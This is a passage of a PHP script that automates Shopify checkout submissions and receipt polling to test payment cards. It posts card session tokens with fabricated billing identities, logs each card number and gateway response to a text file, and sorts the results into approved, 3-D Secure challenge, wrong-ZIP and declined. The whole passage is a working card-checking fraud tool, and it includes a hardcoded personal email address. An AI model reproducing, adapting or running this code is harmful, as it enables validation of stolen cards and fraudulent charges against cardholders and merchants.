        ]);    
} 
elseif ($currencycode == 'NZD') {
    $postf = json_encode([
'query' => extractQueryFromFile('jsonq.txt', 4),
        'variables' => [
            'input' => [
                'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyMatchingConditions' => [
                                    'estimatedTimeInTransit' => [
                                        'any' => true
                                    ],
                                    'shipments' => [
                                        'any' => true
                                    ]
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'NONE'
                            ],
                            'expectedTotalPrice' => [
                                'any' => true
                            ],
                            'destinationChanged' => true
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => '11 Northside Drive',
                                            'address2' => 'Westgate',
                                            'city' => 'Auckland',
                                            'countryCode' => 'NZ',
                                            'postalCode' => '0814',
                                            'firstName' => 'xypher',
                                            'lastName' => 'xd',
                                            'zoneCode' => 'AUK',
                                            'phone' => ''
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => '11 Northside Drive',
                            'address2' => 'Westgate',
                            'city' => 'Auckland',
                            'countryCode' => 'NZ',
                            'postalCode' => '0814',
                            'firstName' => 'xypher',
                            'lastName' => 'xd',
                            'zoneCode' => 'AUK',
                            'phone' => ''
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'NZD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'insaneff612@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'NZD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => $checkoutToken . '-y4dcjm00nor',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
}

 else {$postf = json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 5),
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'destination' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $zip_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                    ]
                                ]
                            ],
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyByHandle' => [
                                    'handle' => $handle,
                                    'customDeliveryRate' => false
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'SHIPPING',
                                'LOCAL'
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $delamount,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'destinationChanged' => false
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                    'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => $address,
                                            'address2' => '',
                                            'city' => $city_us,
                                            'countryCode' => 'US',
                                            'postalCode' => $zip_us,
                                            'firstName' => $firstname,
                                            'lastName' => $lastname,
                                            'zoneCode' => $zip_us,
                                            'phone' => $phone
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => $address,
                            'address2' => '',
                            'city' => $city_us,
                            'countryCode' => 'US',
                            'postalCode' => $zip_us,
                            'firstName' => $firstname,
                            'lastName' => $lastname,
                            'zoneCode' => $state_us,
                            'phone' => $phone
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'USD',
                        'countryCode' => 'US'
                    ],
                    'email' => $email,
                    'emailChanged' => false,
                    'phoneCountryCode' => 'US',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'countryCode' => 'US'
                    ]
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => $tax,
                            'currencyCode' => 'USD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);    
}
    $totalamt = $firstStrategy->runningTotal->value->amount;
recipt:
    // sleep(3);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase.'/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);


curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

$response4 = curl_exec($ch);
//echo "<li>receipt: $response4<li>";
if (curl_errno($ch)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt; 
    } else {
        error(curl_error($ch), $totalamt, $gateway, $cc1);
    }
}

$response4js = json_decode($response4);

if (isset($response4js->data->submitForCompletion->receipt->id)) {
    $recipt_id = $response4js->data->submitForCompletion->receipt->id;
} elseif (empty($recipt_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        error('Missing special token Recipt ID.', $totalamt, $gateway, $cc1);
    }
}

 

poll:
$postf2 = json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 6),
    'variables' => [
        'receiptId' => $recipt_id,
        'sessionToken' => $x_checkout_one_session_token
    ],
    'operationName' => 'PollForReceipt'

]);
// sleep(3);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

$response5 = curl_exec($ch);
// echo "<li>Resp_5: $response5<li>";
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll; 
    } else {
    error('Curl Error.', $totalamt, $gateway, $cc1);
}
}
if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    sleep(2); // Espera 3 segundos antes de reintentar
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        echo "Error: Max Retries";
        exit;
    }
}

if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
    sleep(2); // Espera 3 segundos antes de reintentar
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        echo "Error: Max Retries";
        exit;
    }
}

// echo "<li>CheckoutUrl: $checkouturl<li>";
$file = "cc_responses.txt";
$handle = fopen($file, "a");
$content = "cc = $cc1\nresponse = $response5\n\n";
$r5js = (json_decode($response5));
$r5js = json_decode($response5);

if (
    strpos($response5, $checkouturl . '/thank_you') !== false ||
    strpos($response5, $checkouturl . '/post_purchase') !== false ||
    strpos($response5, 'Your order is confirmed') !== false ||
    strpos($response5, 'Thank you') !== false ||
    strpos($response5, 'ThankYou') !== false ||
    strpos($response5, 'thank_you') !== false ||
    strpos($response5, 'success') !== false ||
    strpos($response5, 'classicThankYouPageUrl') !== false ||
    strpos($response5, '"__typename":"ProcessedReceipt"') !== false ||
    strpos($response5, 'SUCCESS') !== false
) {
    SucessError('Your order is confirmed', $totalamt, $gateway, $site1, $cc1);
    exit;
}
elseif (strpos($response5, 'CompletePaymentChallenge') !== false) {
    SucessError('CompletePaymentChallenge', $totalamt, $gateway, $site1, $cc1);
}
elseif (strpos($response5, '/stripe/authentications/') !== false) {
    SucessError('stripeAuthentications', $totalamt, $gateway, $site1, $cc1);
}
elseif (strpos($response5, 'incorrect_zip') !== false) {
    SucessError('incorrect_zip', $totalamt, $gateway, $site1, $cc1);
}
elseif (isset($r5js->data->receipt->processingError->code)) {
    SucessError($r5js->data->receipt->processingError->code, $totalamt, $gateway, $site1, $cc1);
}
elseif (strpos($response5, '"__typename":"WaitingReceipt"') !== false || strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    sleep(5);
    goto poll;
}
else {
    SucessError('Unknown Error Message', $totalamt, $gateway, $site1, $cc1);
}
